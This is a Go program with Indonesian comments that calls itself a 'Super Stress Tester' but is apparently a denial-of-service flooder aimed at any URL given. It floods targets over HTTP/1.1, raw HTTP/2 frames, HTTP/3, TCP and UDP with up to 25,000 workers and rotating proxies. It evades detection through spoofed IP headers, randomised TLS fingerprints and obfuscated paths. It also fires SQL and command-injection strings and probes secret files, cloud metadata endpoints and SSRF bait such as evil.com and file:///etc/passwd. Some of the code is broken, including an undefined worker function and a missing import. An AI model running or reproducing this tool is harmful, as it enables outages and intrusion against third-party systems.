package main

import (
    "bufio"
    "bytes"
    "context"
    "crypto/rand"
    "crypto/tls"
    "encoding/hex"
    "fmt"
    "io"
    mrand "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "runtime"
    "strings"
    "sync"
    "sync/atomic"
    "syscall"
    "time"

    "golang.org/x/net/http2"
    "golang.org/x/net/http2/hpack"
    "golang.org/x/net/proxy"
    tlsutls "github.com/refraction-networking/utls"
    "github.com/quic-go/quic-go/http3"
)

type Config struct {
    BaseURL    string
    Workers    int      // Diubah default menjadi lebih tinggi di main()
    ProxyFile  string
    UAFile     string
    MethodFile string
    PathFile   string
    Mode       string   // h1, h2, h3, rawtcp, rawudp, mix, super
    UseHTTP2   bool
}

var (
    total, success, fail int64
    ctx, cancel          = context.WithCancel(context.Background())
)

func readLines(fn string) []string {
    f, _ := os.Open(fn)
    defer f.Close()
    s := bufio.NewScanner(f)
    var l []string
    for s.Scan() {
        line := strings.TrimSpace(s.Text())
        if line != "" && !strings.HasPrefix(line, "#") {
            l = append(l, line)
        }
    }
    return l
}

func randomHex(n int) string {
    b := make([]byte, n)
    rand.Read(b)
    return hex.EncodeToString(b)
}

func shuffle(slice []string) {
    mrand.Shuffle(len(slice), func(i, j int) {
        slice[i], slice[j] = slice[j], slice[i]
    })
}

func randomCase(s string) string {
    r := []rune(s)
    for i, c := range r {
        if mrand.Intn(2) == 0 {
            r[i] = []rune(strings.ToUpper(string(c)))[0]
        } else {
            r[i] = []rune(strings.ToLower(string(c)))[0]
        }
    }
    return string(r)
}

func randomTypo(h string) string {
    if mrand.Intn(7) == 0 {
        idx := mrand.Intn(len(h))
        return h[:idx] + string('a'+mrand.Intn(26)) + h[idx+1:]
    }
    return h
}

func randomHeaders(u string, base string) http.Header {
    // Generate random IP
    ip := func() string {
        return fmt.Sprintf("%d.%d.%d.%d", mrand.Intn(256), mrand.Intn(256), mrand.Intn(256), mrand.Intn(256))
    }

    m := map[string]string{
        randomCase("User-Agent"):         u,
        randomCase("Referer"):            base + "/",
        randomCase("X-Requested-With"):   "XMLHttpRequest",
        randomCase("Origin"):             base,
        randomCase("Cookie"):             "sess=" + randomHex(12),
        randomCase("X-CSRF-Token"):       randomHex(16),
        randomCase("X-API-Key"):          randomHex(24),
        randomCase("Accept-Encoding"):    "gzip, deflate, br",
        randomCase("Cache-Control"):      "no-cache",
        randomCase("X-Forwarded-Proto"):  "https",
        randomCase("X-Forwarded-For"):    ip(),
        randomCase("X-Real-IP"):          ip(),
        randomCase("True-Client-IP"):     ip(),
        randomCase("Client-IP"):          ip(),
        randomCase("Forwarded"):          fmt.Sprintf("for=%s;proto=https", ip()),
        randomCase("X-Originating-IP"):   ip(),
        randomCase("X-Remote-IP"):        ip(),
        randomCase("X-Remote-Addr"):      ip(),
        randomCase("Authorization"):      "Bearer " + randomHex(32),
        randomCase("X-Amzn-Trace-Id"):    "Root=" + randomHex(32),
        randomCase("X-Forwarded-Host"):   base,
        randomCase("Forwarded-For"):      ip(),
        randomCase("X-Forwarded-Server"): "internal." + base,
        randomCase("X-Wap-Profile"):      "http://wap.samsungmobile.com/uaprof/",
        randomCase("Connection"):         "keep-alive",
        randomCase("TE"):                 "trailers",
    }

    // Daftar IP headers canggih
    ipHeaders := []string{
        "X-Forwarded-For",
        "X-Real-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "X-Client-IP",
        "X-Cluster-Client-IP",
        "Forwarded-For",
        "Forwarded",
        "Fastly-Client-IP",
        "X-Forwarded",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-ProxyUser-IP",
        "Via",
    }

    // Inject IP spoofing headers secara acak dengan typo
    for _, h := range ipHeaders {
        if mrand.Intn(2) == 0 {
            m[randomTypo(randomCase(h))] = ip()
        }
    }

    // Daftar extra headers advance
    extraHeaders := []string{
        "Accept",
        "Accept-Language",
        "Accept-Charset",
        "Accept-Datetime",
        "Cache-Control",
        "Pragma",
        "DNT",
        "Upgrade-Insecure-Requests",
        "Sec-Fetch-Dest",
        "Sec-Fetch-Mode",
        "Sec-Fetch-Site",
        "Sec-Fetch-User",
        "X-Requested-With",
        "X-Requested-By",
        "X-Request-ID",
        "X-Correlation-ID",
        "X-Amzn-Trace-Id",
        "X-Powered-By",
        "X-Original-URL",
        "X-Rewrite-URL",
        "Front-End-Https",
        "X-ATT-DeviceId",
        "X-UIDH",
        "X-Csrf-Token",
        "X-Api-Version",
        "X-Device-ID",
        "X-App-Version",
        "X-Internal-Request",
        "Client-IP",
        "X-Real-Hostname",
        "X-Original-Host",
    }

    // Tambahkan extra headers secara random
    for _, h := range extraHeaders {
        if mrand.Intn(2) == 0 {
            m[randomTypo(randomCase(h))] = randomHex(8)
        }
    }

    // Tambahkan random custom header
    if mrand.Intn(3) == 0 {
        m[randomTypo(randomCase("X-Custom-"+randomHex(4)))] = randomHex(12)
    }

    // Convert ke http.Header dengan urutan random
    keys := make([]string, 0, len(m))
    for k := range m {
        keys = append(keys, k)
    }
    mrand.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })
    
    h := http.Header{}
    for _, k := range keys {
        h.Set(k, m[k])
    }
    return h
}

func randomPath(paths, mal []string) string {
    base := paths[mrand.Intn(len(paths))]
    // Naikkan peluang ambil dari malicious path supaya agresif
    if mrand.Intn(10) < 5 {
        base = mal[mrand.Intn(len(mal))]
    }

    // Tambahkan hex acak di path sebagai subfolder random
    if mrand.Intn(3) == 0 {
        base += "/" + randomHex(5+mrand.Intn(10))
    }

    // Tambahkan suffix file umum buat trigger pattern matching web server / IDS
    if mrand.Intn(4) == 0 {
        suffixes := []string{".php", ".asp", ".json", ".bak", ".gz", ".zip", ".sql", ".config"}
        base += suffixes[mrand.Intn(len(suffixes))]
    }

    // Tambahkan query string random, tapi urutan parameter acak
    if mrand.Intn(4) == 0 {
        params := []string{
            "q=" + randomHex(6+mrand.Intn(8)),
            "debug=true",
            "token=" + randomHex(16),
            "lang=en-US",
            "v=" + fmt.Sprintf("%d", mrand.Intn(100000)),
            "t=" + randomHex(4),
            "callback=JSON_CALLBACK",
        }
        shuffle(params)  // Acak parameter supaya tiap request beda urutan
        base += "?" + strings.Join(params[:mrand.Intn(len(params)-1)+1], "&")
    }

    // Inject emoji URL encoding supaya payload jadi lebih susah diprediksi signature-nya
    if mrand.Intn(6) == 0 {
        base += fmt.Sprintf("/%%F0%%9F%%98%%80%s%%F0%%9F%%92%%A5", randomHex(4))
    }

    // Obfuscation path dengan URL encoding, double encoding, dsb
    if mrand.Intn(5) == 0 {
        obf := []string{"%2e", "%2f", "%25", "%2e%2e", "%2f%2e", "%252e", "%252f"}
        base = "/" + obf[mrand.Intn(len(obf))] + base
    }

    // Tambahkan trailing slash atau karakter aneh agar lebih tricky
    if mrand.Intn(3) == 0 {
        base += []string{"/", "//", "/.", "/~"}[mrand.Intn(4)]
    }

    return base
}

func randomPayload() string {
    switch mrand.Intn(8) { // Variasi lebih luas
    case 0:
        // JSON dengan field acak
        return fmt.Sprintf(`{"%s":"%s","%s":%d,"ts":%d}`,
            randomHex(8), randomHex(15+mrand.Intn(10)),
            randomHex(8), mrand.Intn(9999),
            time.Now().UnixNano())
    case 1:
        // XML inject
        return fmt.Sprintf(`<rpc><method>%s</method><arg>%s</arg></rpc>`,
            randomHex(8), randomHex(20))
    case 2:
        // Form-urlencoded
        return fmt.Sprintf("data=%s&time=%d&nonce=%s&sig=%s",
            randomHex(10), time.Now().Unix(), randomHex(8), randomHex(6))
    case 3:
        // Random binary (junk)
        b := make([]byte, 32+mrand.Intn(64))
        rand.Read(b)
        return string(b)
    case 4:
        // Encoded JSON (obfuscated payload)
        encoded := fmt.Sprintf(`{"data":"%s","meta":"%s"}`, randomHex(16), randomHex(8))
        return "payload=" + url.QueryEscape(encoded)
    case 5:
        // Multipart + boundary spoofing
        boundary := randomHex(12)
        content := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\n%s\r\n--%s--",
            boundary, randomHex(40), boundary)
        return content
    case 6:
        // GraphQL-like
        return fmt.Sprintf(`{"query":"query {%s(id: \"%s\") {result}}","variables":{}}`,
            randomHex(8), randomHex(12))
    default:
        // Raw SQL or command injection simulation
        injections := []string{
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "admin'--",
            `" UNION SELECT NULL, version() -- `,
            "`; exec xp_cmdshell('whoami') --",
        }
        return "input=" + url.QueryEscape(injections[mrand.Intn(len(injections))])
    }
}

// -- HTTP/1.1 & HTTP/2 Client --
func makeClient(proxyAddr string, useH2 bool, tlsConf *tlsutls.Config) *http.Client {
    if proxyAddr != "" {
        addr := proxyAddr
        if strings.HasPrefix(addr, "socks5://") {
            addr = strings.TrimPrefix(addr, "socks5://")
        }
        dialer, err := proxy.SOCKS5("tcp", addr, nil, proxy.Direct)
        if err != nil {
            return makeDirectClient(useH2, tlsConf)
        }
        tr := &http.Transport{
            Dial:                dialer.Dial,
            TLSHandshakeTimeout: 500 * time.Millisecond,
            DisableKeepAlives:   false,
            MaxIdleConns:        500,              // Ditingkatkan
            MaxConnsPerHost:     250,              // Ditingkatkan
            IdleConnTimeout:     30 * time.Second, // Dioptimalkan
            DisableCompression:  true,
            ForceAttemptHTTP2:   useH2,
        }
        if useH2 {
            http2.ConfigureTransport(tr)
        }
        return &http.Client{Transport: tr, Timeout: 5 * time.Second}
    }
    return makeDirectClient(useH2, tlsConf)
}

func makeDirectClient(useH2 bool, tlsConf *tlsutls.Config) *http.Client {
    dialTLS := func(network, addr string) (net.Conn, error) {
        conn, err := net.DialTimeout(network, addr, 3*time.Second) // Ditingkatkan timeout
        if err != nil {
            return nil, err
        }
        uconn := tlsutls.UClient(conn, tlsConf, tlsutls.HelloRandomized)
        err = uconn.HandshakeContext(context.Background()) // Menggunakan HandshakeContext
        return uconn, err
    }

    tr := &http.Transport{
        DialContext: (&net.Dialer{
            Timeout:   3 * time.Second,  // Ditingkatkan
            KeepAlive: 30 * time.Second, // Ditambahkan
            DualStack: true,             // Ditambahkan - mendukung IPv4/IPv6
        }).DialContext,
        TLSClientConfig:     nil,
        TLSHandshakeTimeout: 3 * time.Second,  // Ditingkatkan
        ForceAttemptHTTP2:   useH2,
        DialTLS:             dialTLS,
        MaxIdleConns:        1000,             // Ditingkatkan drastis
        IdleConnTimeout:     90 * time.Second,
        DisableCompression:  true,
        DisableKeepAlives:   false,
        MaxConnsPerHost:     0,                // Unlimited
        MaxIdleConnsPerHost: 100,             // Ditambahkan
        ExpectContinueTimeout: 1 * time.Second, // Ditambahkan
        ResponseHeaderTimeout: 5 * time.Second, // Ditambahkan
    }

    if useH2 {
        http2.ConfigureTransport(tr)
    }

    return &http.Client{
        Transport: tr,
        Timeout:   30 * time.Second,  // Ditingkatkan
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            // Izinkan maksimal 10 redirect
            if len(via) >= 10 {
                return http.ErrUseLastResponse
            }
            return nil
        },
    }
}

// -- HTTP/2 Framer Custom --
func customHTTP2Frame(target string, host string, path string) {
    conn, err := net.DialTimeout("tcp", target+":443", 3*time.Second) // Ditambahkan timeout
    if err != nil {
        return
    }
    defer conn.Close() // Ditambahkan defer close

    config := &tls.Config{
        ServerName:         host,
        InsecureSkipVerify: true,
        NextProtos:         []string{"h2"},
        MinVersion:         tls.VersionTLS12, // Ditambahkan minimum TLS version
        MaxVersion:         tls.VersionTLS13, // Ditambahkan maximum TLS version
    }
    
    tlsConn := tls.Client(conn, config)
    err = tlsConn.HandshakeContext(context.Background()) // Menggunakan HandshakeContext
    if err != nil {
        return
    }
    defer tlsConn.Close() // Ditambahkan defer close

    fr := http2.NewFramer(tlsConn, tlsConn)
    fr.WriteSettings(
        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 250},   // Ditingkatkan
        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1<< 20},   // Ditambahkan
        http2.Setting{ID: http2.SettingMaxFrameSize, Val: 1<< 16},        // Ditambahkan
    )
    
    // Multiple PING frames
    for i := 0; i < 5; i++ {
        pingData := [8]byte{}
        rand.Read(pingData[:])
        fr.WritePing(false, pingData)
    }

    var headerBuf bytes.Buffer
    hpackEnc := hpack.NewEncoder(&headerBuf)
    
    // Headers yang lebih beragam
    headers := []hpack.HeaderField{
        {Name: ":method", Value: "GET"},
        {Name: ":path", Value: path},
        {Name: ":scheme", Value: "https"},
        {Name: ":authority", Value: host},
        {Name: "user-agent", Value: "Mozilla/5.0 (compatible; HTTP/2.0)"},
        {Name: "accept", Value: "*/*"},
        {Name: "accept-encoding", Value: "gzip, deflate, br"},
        {Name: "accept-language", Value: "en-US,en;q=0.9"},
        {Name: "cache-control", Value: "no-cache"},
        {Name: "pragma", Value: "no-cache"},
    }

    for _, h := range headers {
        hpackEnc.WriteField(h)
    }

    headerBlock := headerBuf.Bytes()
    fr.WriteHeaders(http2.HeadersFrameParam{
        StreamID:      1,
        BlockFragment: headerBlock,
        EndHeaders:    true,
        EndStream:     true,
    })
}

// -- HTTP/3 (QUIC) --
func customHTTP3(target, path string) {
    roundTripper := &http3.RoundTripper{
        EnableDatagrams: true,            // Tambahan
        MaxHeaderBytes: 1 << 100,          // Ditingkatkan
        MaxResponseHeaderBytes: 1 << 100,   // Ditingkatkan
        QuicConfig: &quic.Config{        
            MaxIncomingStreams: 5000,     // Ditingkatkan
            MaxIncomingUniStreams: 5000,  // Ditingkatkan
            KeepAlivePeriod: 10 * time.Second,
            HandshakeTimeout: 5 * time.Second,
            MaxIdleTimeout: 30 * time.Second,
        },
    }
    defer roundTripper.Close()

    client := &http.Client{
        Transport: roundTripper,
        Timeout:   10 * time.Second,      // Ditingkatkan
    }

    // Multiple headers untuk HTTP/3
    headers := []struct {
        key, value string
    }{
        {"User-Agent", "HTTP/3-client"},
        {"Accept", "*/*"},
        {"Accept-Encoding", "gzip, deflate, br"},
        {"Cache-Control", "no-cache"},
        {"X-HTTP3", "enabled"},
        {"X-QUIC-Priority", "high"},
    }

    // Buat beberapa request paralel
    var wg sync.WaitGroup
    for i := 0; i < 25; i++ { // Ditingkatkan jumlah request parallel
        wg.Add(1)
        go func() {
            defer wg.Done()
            
            req, err := http.NewRequest("GET", "https://"+target+path, nil)
            if err != nil {
                return
            }

            // Tambahkan headers
            for _, h := range headers {
                req.Header.Set(h.key, h.value)
            }
            
            // Tambahkan random headers
            req.Header.Set("X-Request-ID", randomHex(16))
            req.Header.Set("X-Stream-ID", fmt.Sprintf("%d", mrand.Int63()))

            resp, err := client.Do(req)
            if err == nil && resp != nil {
                io.Copy(io.Discard, resp.Body)
                resp.Body.Close()
            }
        }()
    }
    wg.Wait()
}

// -- RAW TCP/UDP --
func rawTCP(target string, host string, path string) {
    // Buat multiple koneksi parallel
    var wg sync.WaitGroup
    for i := 0; i < 10; i++ { // Ditingkatkan jumlah koneksi
        wg.Add(1)
        go func() {
            defer wg.Done()

            // Set timeout untuk koneksi
            conn, err := net.DialTimeout("tcp", target+":80", 2*time.Second)
            if err != nil {
                return
            }
            defer conn.Close()

            // Set deadline untuk operasi read/write
            deadline := time.Now().Add(5 * time.Second)
            conn.SetDeadline(deadline)

            // Headers yang lebih kompleks
            headers := []string{
                fmt.Sprintf("GET %s HTTP/1.1", path),
                fmt.Sprintf("Host: %s", host),
                "User-Agent: Mozilla/5.0 (compatible)",
                "Accept: */*",
                "Accept-Encoding: gzip, deflate",
                "Connection: keep-alive",
                fmt.Sprintf("X-Request-ID: %s", randomHex(16)),
                fmt.Sprintf("X-Timestamp: %d", time.Now().UnixNano()),
                fmt.Sprintf("Cookie: session=%s", randomHex(32)),
                "", // Empty line to end headers
                "",
            }

            // Kirim request
            req := strings.Join(headers, "\r\n")
            _, err = conn.Write([]byte(req))
            if err != nil {
                return
            }

            // Baca response (opsional, tergantung kebutuhan)
            buf := make([]byte, 4096)
            conn.Read(buf)
        }()
    }
    wg.Wait()
}

func rawUDP(target string) {
    // Buat multiple koneksi parallel
    var wg sync.WaitGroup
    for i := 0; i < 75; i++ { // Ditingkatkan jumlah koneksi
        wg.Add(1)
        go func() {
            defer wg.Done()

            conn, err := net.Dial("udp", target+":80")
            if err != nil {
                return
            }
            defer conn.Close()

            // Kirim multiple packets per koneksi
            for j := 0; j < 50; j++ { // Ditingkatkan jumlah packets
                // Generate payload yang lebih besar dan random
                payload := make([]byte, 512+mrand.Intn(512)) // 512-1024 bytes
                rand.Read(payload)

                // Tambahkan header palsu ke payload
                header := fmt.Sprintf("UDP-Req-%d-%s", j, randomHex(8))
                fullPayload := append([]byte(header), payload...)

                conn.Write(fullPayload)
                time.Sleep(10 * time.Millisecond) // Slight delay between packets
            }
        }()
    }
    wg.Wait()
}

func pickMode(mode string) string {
    if mode != "mix" {
        return mode
    }
    // Ditambahkan lebih banyak variasi mode
    m := []string{"h1", "h2", "h2c", "h2f", "h3", "rawtcp", "rawudp", "h2f-flood", "h3-flood"}
    return m[mrand.Intn(len(m))]
}

func workerSuper(jobs <-chan struct{}, config *Config, proxies, agents, methods, paths, mal []string, wg *sync.WaitGroup) {
    defer wg.Done()
    
    tlsConf := &tlsutls.Config{
        InsecureSkipVerify: true,
        MinVersion:         tls.VersionTLS12,
        MaxVersion:         tls.VersionTLS13,
        CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
    }

    baseURL := config.BaseURL
    u, _ := url.Parse(baseURL)
    host := u.Hostname()
    target := host
    if u.Port() != "" {
        target += ":" + u.Port()
    }

    // Super aggressive proxy rotation
    proxyRotation := time.NewTicker(1 * time.Second) // Diubah dari 2 detik
    defer proxyRotation.Stop()
    
    var currentClient *http.Client
    clientMutex := &sync.Mutex{} // Untuk thread safety
    
    // Inisialisasi client pertama
    if len(proxies) > 0 {
        currentClient = makeClient(proxies[mrand.Intn(len(proxies))], true, tlsConf)
    } else {
        currentClient = makeClient("", true, tlsConf)
    }

    // Goroutine untuk rotasi proxy
    go func() {
        for range proxyRotation.C {
            if len(proxies) > 0 {
                newClient := makeClient(proxies[mrand.Intn(len(proxies))], true, tlsConf)
                clientMutex.Lock()
                currentClient = newClient
                clientMutex.Unlock()
            }
        }
    }()

    for range jobs {
        // Execute all attack modes simultaneously
        modes := []string{"h2f", "h3", "rawtcp", "rawudp", "h1", "h2"}
        var attackWg sync.WaitGroup
        
        for _, mode := range modes {
            attackWg.Add(1)
            go func(attackMode string) {
                defer attackWg.Done()
                
                path := randomPath(paths, mal)
                
                switch attackMode {
                case "h2f":
                    // Aggressive HTTP/2 frames
                    for i := 0; i < 50; i++ { // Ditingkatkan dari 10
                        customHTTP2Frame(target, host, path)
                        time.Sleep(10 * time.Millisecond)
                    }
                
                case "h3":
                    // Aggressive HTTP/3 requests
                    for i := 0; i < 50; i++ { // Ditingkatkan dari 10
                        customHTTP3(target, path)
                        time.Sleep(10 * time.Millisecond)
                    }
                
                case "rawtcp":
                    // Aggressive TCP connections
                    for i := 0; i < 75; i++ { // Ditingkatkan dari 15
                        rawTCP(target, host, path)
                        time.Sleep(5 * time.Millisecond)
                    }
                
                case "rawudp":
                    // Aggressive UDP packets
                    for i := 0; i < 100; i++ { // Ditingkatkan dari 20
                        rawUDP(target)
                        time.Sleep(5 * time.Millisecond)
                    }
                
                default: // HTTP/1.1 or HTTP/2
                    clientMutex.Lock()
                    client := currentClient
                    clientMutex.Unlock()
                    
                    method := methods[mrand.Intn(len(methods))]
                    ua := agents[mrand.Intn(len(agents))]
                    url := baseURL + path
                    
                    // Prepare payload
                    var body io.Reader
                    if method == "POST" || method == "PUT" || method == "PATCH" {
                        body = strings.NewReader(randomPayload())
                    }
                    
                    // Create request with context
                    req, err := http.NewRequestWithContext(ctx, method, url, body)
                    if err != nil {
                        atomic.AddInt64(&total, 1)
                        atomic.AddInt64(&fail, 1)
                        return
                    }
                    
                    // Set super aggressive headers
                    req.Header = randomHeaders(ua, config.BaseURL)
                    
                    // Multiple aggressive attempts per request
                    for i := 0; i < 25; i++ { // Ditingkatkan dari 5
                        resp, err := client.Do(req)
                        atomic.AddInt64(&total, 1)
                        
                        if err == nil && resp != nil {
                            io.Copy(io.Discard, resp.Body)
                            resp.Body.Close()
                            atomic.AddInt64(&success, 1)
                        } else {
                            atomic.AddInt64(&fail, 1)
                        }
                        
                        time.Sleep(25 * time.Millisecond) // Dikurangi dari 50ms
                    }
                }
            }(mode)
        }
        attackWg.Wait()
    }
}

func setupShutdown() {
    c := make(chan os.Signal, 1)
    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
    go func() {
        <-c
        fmt.Println("\n[!] Shutting down...")
        cancel()
    }()
}

func main() {
    if len(os.Args) < 7 {
        fmt.Println(`
╔══════════════════════════════════════════╗
║           Super Stress Tester            ║
╠══════════════════════════════════════════╣
║ Usage:                                   ║
║ go run t.go <url> <workers> <proxy.txt>  ║
║ <useragents.txt> <methods.txt>          ║
║ <paths.txt> [mode]                      ║
║                                         ║
║ Modes:                                  ║
║ - super (recommended)                   ║
║ - mix                                   ║
║ - h1                                    ║
║ - h2                                    ║
║ - h2f                                   ║
║ - h3                                    ║
║ - rawtcp                                ║
║ - rawudp                                ║
╚══════════════════════════════════════════╝
        `)
        return
    }

    // Enhanced configuration
    config := &Config{
        BaseURL:    os.Args[1],
        Workers:    25000,         // Default ditingkatkan dari 2000
        ProxyFile:  os.Args[3],
        UAFile:     os.Args[4],
        MethodFile: os.Args[5],
        PathFile:   os.Args[6],
        Mode:       "super",      // Default ke super mode
    }

    // Parse worker count
    if workerCount, err := fmt.Sscanf(os.Args[2], "%d", &config.Workers); err == nil && workerCount > 0 {
        if config.Workers > 10000 {
            fmt.Println("[!] Warning: High worker count may cause system instability")
        }
    }

    // Set mode if provided
    if len(os.Args) > 7 {
        config.Mode = os.Args[7]
    }

    // Load resources
    proxies := readLines(config.ProxyFile)
    agents := readLines(config.UAFile)
    methods := readLines(config.MethodFile)
    paths := readLines(config.PathFile)

    // Enhanced malicious paths
    mal := []string{
    // File disclosure, config leakage
    "/.git/HEAD",
    "/.gitignore",
    "/.svn/entries",
    "/.hg/store",
    "/.bzr/branch/branch.conf",
    "/.env.local",
    "/.env.dev",
    "/.env.production",
    "/.vscode/settings.json",
    "/composer.lock",
    "/package-lock.json",
    "/yarn.lock",

    // Internal panels & debug tools
    "/adminer.php",
    "/pma/index.php",
    "/dbadmin/",
    "/dashboard/",
    "/debug",
    "/debug/vars",
    "/_profiler",             // Symfony
    "/_debugbar",            // Laravel Debugbar
    "/graphql",              // GraphQL endpoint
    "/graphiql",             // Interactive GraphQL interface
    "/api/graphql",
    "/api/playground",       // GraphQL playground

    // CI/CD systems
    "/.github/workflows/",
    "/.gitlab-ci.yml",
    "/jenkins/script",
    "/jenkins/login",
    "/teamcity/",
    "/bamboo/",
    "/.circleci/config.yml",

    // Cloud metadata endpoints
    "/latest/meta-data/",             // AWS
    "/computeMetadata/v1/",           // GCP
    "/metadata/instance",             // Azure

    // Static code/file exposure
    "/main.js.map",
    "/app.js.map",
    "/bundle.js.map",
    "/config.js",
    "/secret.js",
    "/keys.json",
    "/api-keys.json",

    // Common custom paths used by dev teams (temuan dari banyak bounty)
    "/api/test",
    "/api/dev",
    "/api/debug",
    "/api/v1/debug",
    "/api/v1/test",
    "/user/settings/export",
    "/account/delete",
    "/internal/status",
    "/internal/version",
    "/internal/env",
    "/internal/logs",

    // SSRF bait & URL reflection
    "/url?target=http://localhost",
    "/proxy?url=http://127.0.0.1:8000",
    "/admin/fetch?url=https://evil.com",
    "/render?url=file:///etc/passwd",

    // RCE / payload injection spots (kalau endpoint vulnerable)
    "/api/exec",
    "/run",
    "/admin/cmd",
    "/shell.php",
    "/cmd.jsp",
    "/cmd.cgi",

    // Misconfigured Open APIs
    "/actuator/env",
    "/actuator/mappings",
    "/v2/api-docs",
    "/swagger-ui.html",
    "/redoc",
    "/q/swagger-ui", // Quarkus dev UI
}

    // Optimize system resources
    runtime.GOMAXPROCS(runtime.NumCPU() * 4) // Ditingkatkan dari 2

    // Print banner
    fmt.Printf(`
🚀 Starting Super Stress Test
URL: %s
Workers: %d
Mode: %s
Proxies: %d
User-Agents: %d
Methods: %d
Paths: %d
`, config.BaseURL, config.Workers, config.Mode, len(proxies), len(agents), len(methods), len(paths))

    // Setup graceful shutdown
    setupShutdown()

    // Initialize worker pool
    var wg sync.WaitGroup
    jobs := make(chan struct{}, config.Workers)

    // Start statistics monitor
    go func() {
        lastTotal := int64(0)
        ticker := time.NewTicker(time.Second)
        defer ticker.Stop()

        for {
            select {
            case <-ctx.Done():
                return
            case <-ticker.C:
                current := atomic.LoadInt64(&total)
                rps := current - lastTotal
                lastTotal = current
                s := atomic.LoadInt64(&success)
                f := atomic.LoadInt64(&fail)
                fmt.Printf("\rRPS: %-5d | Total: %-8d | Success: %-8d | Fail: %-8d | Rate: %.2f%%",
                    rps, current, s, f, float64(s)/float64(current)*100)
            }
        }
    }()

    // Launch workers based on mode
    if config.Mode == "super" {
        fmt.Println("\n[*] Launching super workers...")
        for i := 0; i < config.Workers; i++ {
            wg.Add(1)
            go workerSuper(jobs, config, proxies, agents, methods, paths, mal, &wg)
        }
    } else {
        fmt.Println("\n[*] Launching standard workers...")
        for i := 0; i < config.Workers; i++ {
            wg.Add(1)
            go worker(jobs, config, proxies, agents, methods, paths, mal, &wg)
        }
    }

    // Main loop
    for {
        select {
        case <-ctx.Done():
            close(jobs)
            wg.Wait()
            t := atomic.LoadInt64(&total)
            s := atomic.LoadInt64(&success)
            f := atomic.LoadInt64(&fail)
            fmt.Printf("\n\n📊 Final Statistics:\nTotal: %d\nSuccess: %d\nFail: %d\nSuccess Rate: %.2f%%\n",
                t, s, f, float64(s)/float64(t)*100)
            return
        default:
            jobs <- struct{}{}
        }
    }
}